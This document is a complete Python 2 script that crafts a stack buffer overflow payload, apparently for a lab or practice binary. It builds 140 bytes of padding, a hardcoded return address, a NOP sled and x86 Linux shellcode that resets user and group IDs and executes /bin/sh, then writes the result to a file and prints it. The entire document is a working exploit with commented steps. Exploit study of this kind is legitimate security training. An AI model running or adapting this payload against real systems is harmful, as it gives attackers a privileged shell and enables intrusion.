#!/usr/bin/python
import struct

def conv(hexAddr): # Convert to packed binary data
    return struct.pack("<I",hexAddr)

def saveFile(fileName,data): # Save crafted string to test exploit in gdb
    with open(fileName,'w') as f:
        f.write(data)

shellcode = \
'\x31\xc0\xb0\xcb\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\xcc\x31\xdb\x31\xc9\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xb0\x01\x31\xc0\xcd\x80'

fileName = 'craftedString.txt' # Name of exploit file containing crafted strings
offset = 140 # The distance between start of buffer till right before EIP
nopSled = '\x90' * 32 # For exploit reliability, so if EIP never hits shellcode, it executes NOP till it hits shellcode
retAddr = conv(0xffffd64c) # Retrieved from inspect the stack

bof = "A" * offset # Initial junk
bof += retAddr # Return address will point to NOP sled
bof += nopSled # NOP sled that tells the CPU to do nothing till it hits shellcode
bof += shellcode # Machine code that pops a shell

saveFile(fileName,bof) # Calls function to save data into a file, in our case, the crafted strings

print bof # Prints crafted strings to the console, useful if we want to execute exploit directly without using cat craftedString.txt
